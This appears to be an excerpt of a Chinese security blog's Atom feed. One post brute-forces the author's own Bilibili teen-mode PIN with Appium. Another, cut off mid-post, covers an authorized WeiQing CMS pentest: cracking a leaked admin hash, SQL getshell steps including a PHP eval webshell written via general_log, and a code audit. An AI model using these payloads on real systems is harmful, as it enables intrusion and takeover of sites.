<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>浮萍&#39;s Blog</title>
  
  <subtitle>学习#坚持</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fuping.site/"/>
  <updated>2020-06-25T09:11:10.770Z</updated>
  <id>https://fuping.site/</id>
  
  <author>
    <name>浮萍</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自动化测试工具Appium初探</title>
    <link href="https://fuping.site/2020/05/29/Test-Automation-Using-Appium/"/>
    <id>https://fuping.site/2020/05/29/Test-Automation-Using-Appium/</id>
    <published>2020-05-29T09:21:55.000Z</published>
    <updated>2020-06-25T09:11:10.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成<code>0000</code>~<code>9999</code>的密码字典，应该就可以找到正确的密码。</p><a id="more"></a><p>经搜索发现，IOS自动化的框架有很多，如UIAutomation、XCTest、KIF、APPium等。其中UIAutomation和APPium无需源码就可以进行测试，而且APPium支持多种语言，所以这里我选择了<a href="http://appium.io/" target="_blank" rel="noopener">APPium</a>。</p><h2 id="0x02-环境搭建与自动化测试"><a href="#0x02-环境搭建与自动化测试" class="headerlink" title="0x02 环境搭建与自动化测试"></a>0x02 环境搭建与自动化测试</h2><h3 id="Appium相关介绍"><a href="#Appium相关介绍" class="headerlink" title="Appium相关介绍"></a>Appium相关介绍</h3><p>Appium 是一个开源工具，用于自动化 iOS 手机、 Android 手机和 Windows 桌面平台上的原生、移动 Web 和混合应用。 它使用WebDriver协议驱动iOS，Android和Windows应用程序。Appium 是跨平台的：它允许用同样的 API 对多平台（iOS、Android、Windows）写测试，做到在 iOS、Android 和 Windows 测试套件之间复用代码。而且支持多种语言，java、python、php、Ruby等等。</p><p>我这里是在MacOS系统下进行的测试，采用了手机版本为13.5.1（IOS真机），开发语言选择了Python3.8。</p><p>下面就开始搭建环境进行测试吧。</p><p>首先是APPium的安装。</p><h3 id="APPium相关安装"><a href="#APPium相关安装" class="headerlink" title="APPium相关安装"></a>APPium相关安装</h3><p>如果没有安装Homebrew，则需要先安装<a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>安装node</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br></pre></td></tr></table></figure><p>安装相关依赖与软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">npm install -g appium <span class="comment"># 安装appium</span></span><br><span class="line">npm install wd</span><br><span class="line">npm install -g appium-doctor</span><br><span class="line">npm i -g mjpeg-consumer</span><br><span class="line">brew install ios-deploy</span><br><span class="line">brew install carthage</span><br><span class="line">brew install lyft/formulae/<span class="built_in">set</span>-simulator-location</span><br><span class="line">npm i -g opencv4nodejs</span><br><span class="line">brew tap facebook/fb</span><br><span class="line">brew install idb-companion</span><br><span class="line">pip install fb-idb</span><br><span class="line">brew tap wix/brew</span><br><span class="line">brew install applesimutils</span><br></pre></td></tr></table></figure><blockquote><p>安装的话根据可以参考<a href="http://appium.io/docs/en/about-appium/getting-started/" target="_blank" rel="noopener">http://appium.io/docs/en/about-appium/getting-started/</a> 进行安装。</p><p>也可以直接安装appium桌面程序<a href="https://github.com/appium/appium-desktop/releases" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases</a> 。</p></blockquote><p>安装后执行<code>appium-doctor --ios</code>指令，可以查看与iOS相关配置是否完整。</p><p>如果有哪一项是打叉的，则根据安装说明进行安装就可以了。</p><p><img src="02.png" alt=""></p><p>下图是全部配置都成功的情况。</p><p><img src="01.png" alt=""></p><p>由于需要在真机下进行测试所以还需要配置<a href="https://github.com/facebookarchive/WebDriverAgent" target="_blank" rel="noopener">WebDriverAgent</a>。</p><h3 id="配置WebDriverAgent"><a href="#配置WebDriverAgent" class="headerlink" title="配置WebDriverAgent"></a>配置WebDriverAgent</h3><p>下载<a href="https://github.com/facebookarchive/WebDriverAgent" target="_blank" rel="noopener">WebDriverAgent</a>。</p><p>进入到WebDriverAgent目录，然后执行<code>./Scripts/bootstrap.sh</code>下载安装依赖库。</p><p><img src="03.png" alt=""></p><p>双击<code>WebDriverAgent.xcodeproj</code>使用xcode打开WebDriverAgent项目</p><p>配置<code>WebDriverAgentLib</code>、<code>WebDriverAgentRunner</code>以及<code>IntegrationApp</code>的开发者信息</p><p><img src="04.png" alt=""></p><p>发现有错误，接下来修改<code>WebDriverAgentRunner</code>和<code>IntegrationApp</code>的<code>Bundle identifier</code>。</p><p><img src="05.png" alt="修改WebDriverAgentRunner"></p><p><img src="06.png" alt="修改IntegrationApp"></p><p>修改后发现无报错信息。然后数据线连接真机，进行安装。</p><p>发现编译失败，将 <code>assign</code> 改成 <code>unsafe_unretained</code> ，然后重新使用<code>command + u</code>进行编译安装测试。</p><p><img src="07.png" alt=""></p><p>然后访问<code>http://手机IP:8100</code>。如<a href="http://172.20.10.1:8100/status" target="_blank" rel="noopener">http://172.20.10.1:8100/status</a> 。</p><p><img src="08.png" alt=""></p><blockquote><p>需要手机与电脑处于同一网络下，我这里为了测试，电脑连接的是手机的热点。</p></blockquote><p>此时WebDriverAgent配置成功。如果在Appium中使用时，还需替换Appium中的WebDriverAgent。</p><p>我这里的路径为<code>/Applications/Appium.app/Contents/Resources/app/node_modules/appium/node_modules/appium-xcuitest-driver/node_modules/WebDriverAgent</code></p><p>直接替换即可，或者直接修改Appium中的WebDriverAgent，效果一样。</p><p>接下来就是自动化脚本的编写。</p><h3 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h3><p>可以通过使用Appium应用程序查看IOS元素特征。启动Appium，左上角菜单栏选择<code>APPium</code>-<code>New Session Window...</code>(或者快捷键<code>command+N</code>)。</p><p><img src="09.png" alt=""></p><p>填写对应的启动参数。</p><p>一些必要的参数：</p><ul><li>platformName是测试平台的名称，是ios或者Android。</li><li>udid在ios真机测试时需要，可以通过<code>ios-deploy --list_bundle_id</code>查询</li><li>bundleId需测试程序的bundle id,可以通过<code>ios-deploy --list_bundle_id</code>查询</li></ul><p>配置完成后，点击<code>Start Session</code>，手机会自动打开<code>哔哩哔哩</code>APP。</p><p><img src="10.png" alt=""></p><p>可以利用xpath获取元素并进行输入、点击等一系列操作。接下来就可以通过使用Python脚本来进行自动化测试了。</p><p>需要安装appium的python依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Appium-Python-Client</span><br></pre></td></tr></table></figure><p>启动APP的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver <span class="comment">#pip install Appium-Python-Client</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'iOS'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'13.5.1'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'xiamo6'</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'XCUITest'</span></span><br><span class="line">    desired_caps[<span class="string">'udid'</span>] = <span class="string">'8d4************a3'</span></span><br><span class="line">    desired_caps[<span class="string">'bundleId'</span>] = <span class="string">'tv.danmaku.bilianime'</span></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="11.gif" alt="运行效果"></p><p>接下来需要进入到输入密码界面，依次需要点击<code>我的-青少年模式-修改密码（或者关闭青少年模式）</code>。</p><p>利用脚本实现就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">"我的"</span>).click()</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeStaticText[@name=\"青少年模式\"]"</span>).click()</span><br><span class="line">driver.find_element_by_id(<span class="string">"关闭青少年模式"</span>).click()</span><br></pre></td></tr></table></figure><p>运行效果如下</p><p><img src="12.gif" alt="运行效果"></p><blockquote><p>如果是已经打开app 40分钟，或者非正常时段，则直接显示的是输入密码界面。</p></blockquote><p><img src="12.png" alt="运行效果"></p><p>可以利用xpath获取密码输入框元素，输入密码后并点击“立即验证”按钮，主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">driver.set_value(driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[1]"</span>),pwd[<span class="number">0</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[2]"</span>).send_keys(pwd[<span class="number">1</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[3]"</span>).send_keys(pwd[<span class="number">2</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[4]"</span>).send_keys(pwd[<span class="number">3</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"立即验证\"]"</span>).click()</span><br></pre></td></tr></table></figure><p>完整的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver <span class="comment">#pip install Appium-Python-Client</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'iOS'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'13.5.1'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'xiamo6'</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'XCUITest'</span></span><br><span class="line">    desired_caps[<span class="string">'udid'</span>] = <span class="string">'8d4904454b********552e976a3'</span></span><br><span class="line">    desired_caps[<span class="string">'bundleId'</span>] = <span class="string">'tv.danmaku.bilianime'</span></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">5091</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwd = str(p)</span><br><span class="line">            driver.set_value(driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[1]"</span>),pwd[<span class="number">0</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[2]"</span>).send_keys(pwd[<span class="number">1</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[3]"</span>).send_keys(pwd[<span class="number">2</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[4]"</span>).send_keys(pwd[<span class="number">3</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"立即验证\"]"</span>).click()</span><br><span class="line">            print(pwd,<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            print(pwd,<span class="string">'is right'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">     driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果</p><p><img src="13.gif" alt="运行效果"></p><p>由上面执行的结果来看，每次输入前都会等待一会再输入，所以看起来速度很慢。</p><p><img src="14.png" alt="运行效果"></p><p>通过找到上图标记的<code>XCUIElementTypeOther</code>，然后使用<code>Send Keys</code>直接传入一个四位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeWindow[1]/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther"</span>).send_keys(pwd)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"下一步\"]"</span>).click()</span><br></pre></td></tr></table></figure><p>执行结果如图所示。</p><p><img src="15.gif" alt="运行效果"></p><blockquote><p>这里的动图是4倍速播放。</p></blockquote><p>修改过后，发现速度确实有所提升，但是总体速度还是很慢的。经过搜索发现，有帖子说在IOS模拟器上和安卓上会快一些，由于程序无法安装到IOS模拟器，所以这里选择了在安卓设备上进行测试。</p><h3 id="安卓环境下测试"><a href="#安卓环境下测试" class="headerlink" title="安卓环境下测试"></a>安卓环境下测试</h3><p>安卓的环境需要安装Android SDK、JDK、安卓模拟器(真机也可以，这里采用的是Genymotion模拟器)。安装后配置<code>JAVA_HOME</code>、<code>ANDROID_HOME</code>。</p><p>然后通过执行<code>appium-doctor --android</code>来查看是否配置成功，如图所示。</p><p><img src="15.png" alt="运行效果"></p><p>查看android元素信息可以使用<code>uiautomatorviewer</code>。位于Android SDK下的<code>/tools/bin/</code>目录。</p><p>启动模拟器并打开测试的APP，然后打开<code>uiautomatorviewer</code>。选择<code>Device Screenshot</code>（从左至右第二个图标）。</p><p><img src="16.png" alt="运行效果"></p><p>通过<code>tv.danmaku.bili:id/et_code</code>可以定位到编辑框，按钮“立即验证”可以通过<code>tv.danmaku.bili:id/operate</code>来定位。</p><p>这里直接贴使用安卓下自动化爆破的脚本，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'Android'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'6.0'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'Nexus'</span></span><br><span class="line">    desired_caps[<span class="string">'appPackage'</span>] = <span class="string">'tv.danmaku.bili'</span></span><br><span class="line">    desired_caps[<span class="string">'appActivity'</span>] = <span class="string">'ui.splash.SplashActivity'</span></span><br><span class="line">    desired_caps[<span class="string">'noReset'</span>] = <span class="literal">True</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'UiAutomator2'</span></span><br><span class="line"></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pwd <span class="keyword">in</span> range(<span class="number">4011</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            driver.find_element_by_id(<span class="string">'tv.danmaku.bili:id/et_code'</span>).send_keys(pwd)</span><br><span class="line">            driver.find_element_by_id(<span class="string">"tv.danmaku.bili:id/operate"</span>).click()</span><br><span class="line">            print(pwd,<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            print(pwd,<span class="string">'is right'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果如图所示</p><p><img src="17.gif" alt="运行效果"></p><p>对比之下，在Android下的效率是很快的。而且经过测试，安卓破解100次，耗时约<code>139.14s</code>，而ios破解50次，耗时约<code>262.56s</code>。</p><p>所以最后我采用了安卓环境下进行破解，最终成功跑出了密码。</p><p><img src="18.gif" alt="运行效果"></p><p>已经成功找到密码4578。</p><h2 id="0x03-思考"><a href="#0x03-思考" class="headerlink" title="0x03 思考"></a>0x03 思考</h2><p>由于输入密码的时候并没有发生网络请求，猜测密码应该保存在本地。一般情况下本地存储采用sqlite数据库或者是SharePreferences中。</p><p>先查看SharePreferences中的文件，进入<code>/data/data/tv.danmaku.bili/shared_prefs</code>目录。</p><p><img src="17.png" alt="shared_prefs目录"></p><p>发现文件<code>bili_teenagers_mode_preferences20449166.xml</code>，根据文件名发现文件就是和青少年模式有关的配置文件。查看里面的内容</p><p><img src="18.png" alt="teenagers_mode文件"></p><p>发现一串神秘字符串，通过cmd5查询：c2890d44d06bafb6c7b4aa194857ccbc=md5(4578)。正好是设置的密码。</p><p>另外由于登录前可以看到所有的内容，而登录开启青少年模式的账户时，就会进入青少年模式，只能看特定内容。所以退出账户重新登录并抓包，可以看到如下的请求。</p><p><img src="19.png" alt="抓包"></p><p>也成功找到经过md5加密的密码。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这次是因为B站开启了青少年模式，后来密码给忘记了。当时只想着用爆破的方式来解决了，没有想着抓包或者查看保存的数据文件。后来爆破出密码后，又发现可以通过查看配置文件的方式和抓包的方式找到密码。而且之前是打算用ios作为测试的，后来因为效率的问题，才转战安卓。如果使用安卓的话，自动化测试工具也很多，例如UIAutomator2等。</p><p>本文其实就是一个流水账，记录一下自己找回青少年模式密码的过程，可能比较粗糙。有关IOS真机调试更详细的教程可以参考<a href="https://www.jianshu.com/p/ae8846736dba" target="_blank" rel="noopener">使用Appium进行iOS的真机自动化测试</a> 。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成&lt;code&gt;0000&lt;/code&gt;~&lt;code&gt;9999&lt;/code&gt;的密码字典，应该就可以找到正确的密码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="自动化测试" scheme="https://fuping.site/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Appium" scheme="https://fuping.site/tags/Appium/"/>
    
      <category term="自动化测试" scheme="https://fuping.site/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
      <category term="青少年模式" scheme="https://fuping.site/tags/%E9%9D%92%E5%B0%91%E5%B9%B4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>记一次从源代码泄漏到后台获取webshell的过程</title>
    <link href="https://fuping.site/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/"/>
    <id>https://fuping.site/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/</id>
    <published>2020-04-18T06:22:33.000Z</published>
    <updated>2020-04-23T11:13:21.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在一次授权测试中对某网站进行测试时，marry大佬发现了一个网站的备份文件，里面有网站源代码和数据库备份等。根据网站信息和代码都可以发现该系统采用的是微擎cms，利用数据库备份中的用户信息解密后可以登录系统，接下来要看是否可以获取webshell。</p><a id="more"></a><h2 id="0x02-WEBSHELL获取的尝试"><a href="#0x02-WEBSHELL获取的尝试" class="headerlink" title="0x02 WEBSHELL获取的尝试"></a>0x02 WEBSHELL获取的尝试</h2><p>有了数据库备份文件，然后找一下是否有用户的信息，能否登录系统。</p><h3 id="1-登录后台"><a href="#1-登录后台" class="headerlink" title="1.登录后台"></a>1.登录后台</h3><p>解压备份文件可以从<code>data/backup</code>目录下找到数据库的备份，从中找到了用户表<code>ims_users</code>。</p><p><img src="01.png" alt="01"></p><p>知道了用户名、加密后的密码和salt，我们去看一下密码加密的算法。</p><p>我这里直接搜索<code>password</code>，在forget.ctrl.php中找到了一处。</p><p><img src="02.png" alt="02"></p><p>密码加密方法是<code>$password = md5($password . $member_info[&#39;salt&#39;] . $_W[&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]);</code>。是根据<code>原密码+salt+authkey</code>的形式进行拼接，然后进行md5加密。</p><p>authkey在<code>data/config.php</code>文件中。</p><p><img src="03.png" alt="03"></p><p>现在salt和authkey以及加密后的密码已经获得，开始去解密密码是多少。这里我们将<code>salt</code>和<code>authkey</code>拼接为新的<code>salt</code>，然后使用<code>md5($pass.$salt)</code>的加密方式进行解密。</p><p><img src="04.png" alt="04"></p><p>解密后即可登录后台。</p><p><img src="05.png" alt="05"></p><p>接下来就是webshell的获取了。</p><p>本以为都已经是管理员了，获取shell就是分分钟的事，然而事情远远没有那么简单。</p><h3 id="2-失败的获取shell过程"><a href="#2-失败的获取shell过程" class="headerlink" title="2.失败的获取shell过程"></a>2.失败的获取shell过程</h3><p>根据搜索发现，该cms后台获取shell的方法也不少，主要还是围绕执行sql这里。但我这里都失败了，就简单的提一下。</p><p><strong>第一种方法：</strong></p><p>站点管理-附件设置-图片附件设置-支持文件后缀，任意添加一个类型，例如添加<code>pppppp</code>。</p><p>然后执行sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> ims_core_settings <span class="keyword">SET</span> <span class="keyword">value</span> = <span class="keyword">replace</span>(<span class="keyword">value</span>, <span class="string">'pppppp'</span>, <span class="string">'php '</span>)</span><br></pre></td></tr></table></figure><p>更新缓存，之后就可以上传<code>&quot;*.php &quot;</code>文件了。但是有限制，适用于apache下，而且版本有限制。目标站不使用该方法的原因有二，一是该系统上传的位置是腾讯云COS上，二是server是Tengine。</p><p><strong>第二种方法：</strong></p><p>第二种方法也是和sql执行有关，利用日志文件写shell。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;  <span class="comment">#查看配置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;  <span class="comment">#开启general log模式</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'/var/www/html/1.php'</span>;   <span class="comment">#设置日志目录为shell地址</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[cmd]);?&gt;'</span>  <span class="comment">#写入shell</span></span><br></pre></td></tr></table></figure><p>或者通过慢查询（slow_query_log）的方法写shell。但目标系统也是失败，执行sql的时候报错。</p><p>还有一些其他的方法，这里测试也是失败的，就不再列举了。</p><h2 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><p>病急乱投医，熬成老中医。既然之前的方法不管用，只好去翻代码吧，找找是否有新的利用方式。翻出之前的一个文档，从里面找到之前的审计过程，看能否对现在有用。结果打开发现只有一个数据包和还有一句未实现的结论。</p><p><img src="06.png" alt="06"></p><p>没办法，只好重新围着这个点继续审计，看是否能有所进展。</p><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1.分析"></a>1.分析</h3><p>打开文件<code>web/source/cloud/dock.ctrl.php</code>，找到执行的<code>download</code>方法。</p><p><img src="07.png" alt="07"></p><p>代码比较简单，我大概说一下这里的流程：</p><p>如果请求包非Base64加密的格式，那么<code>$data</code>就是请求包的内容。然后对<code>$data</code>进行发序列化返回<code>$ret</code>，接下来获取<code>$ret[&#39;file&#39;]</code>并Base64解密返回<code>$file</code>。当存在<code>gzcompress</code>和<code>gzuncompress</code>这两个函数时，就会利用<code>gzuncompress</code>函数对<code>$file</code>进行解压操作。</p><p>将获取的<code>$file</code>进行md5加密后，与<code>$ret[&#39;path&#39;]</code>以及获取的<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>进行拼接为<code>$string</code>。当满足<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>非空并且<code>$string</code>md5加密后的结果与<code>$ret[&#39;sign&#39;]</code>一致时，才可以进行下面的操作。下面就是文件的写入了，根据<code>$ret[&#39;path&#39;]</code>进行判断，然后写入的位置不一样。</p><p>这里关键的一点就是<code>$_W[&#39;setting&#39;][&#39;site&#39;][&#39;token&#39;]</code>这个值的获取。这个是利用authcode函数对<code>cache_load(cache_system_key(&#39;cloud_transtoken&#39;))</code>进行解密获取的。</p><p><code>authcode</code>函数位于<code>framework/function/global.func.php</code>文件中。</p><p><img src="08.png" alt="08"></p><p>由上面代码可以看出，要想使用<code>authcode</code>加解密，需要知道<code>$GLOBALS[&#39;_W&#39;][&#39;config&#39;][&#39;setting&#39;][&#39;authkey&#39;]</code>，在上面提到过，authkey在<code>data/config.php</code>文件中。</p><p>那么如果想任意写文件，就需要知道<code>cache_system_key(&#39;cloud_transtoken&#39;)</code>的内容了。</p><h3 id="2-cloud-transtoken的获取"><a href="#2-cloud-transtoken的获取" class="headerlink" title="2.cloud_transtoken的获取"></a>2.cloud_transtoken的获取</h3><p>通过搜索发现，这个值是在文件<code>framework/model/cloud.mod.php</code>中的<code>cloud_build_transtoken</code>函数中被写入的，通过进入<code>cache_write</code>方法，发现会写入数据库中。</p><p><img src="09.png" alt="09"></p><p>既然会写入到数据库中，而且目标系统下载到时候有数据库的备份文件，我们直接在数据库备份文件中搜索<code>cloud_transtoken</code>。结果并没有找到，可能原因是没有写入<code>cloud_transtoken</code>的时候就进行了数据库备份。</p><p>我们往上回溯，看哪里调用了<code>cloud_build_transtoken</code>。</p><p>发现了其中的一条利用链：</p><p><img src="10.png" alt="10"></p><p>当访问<a 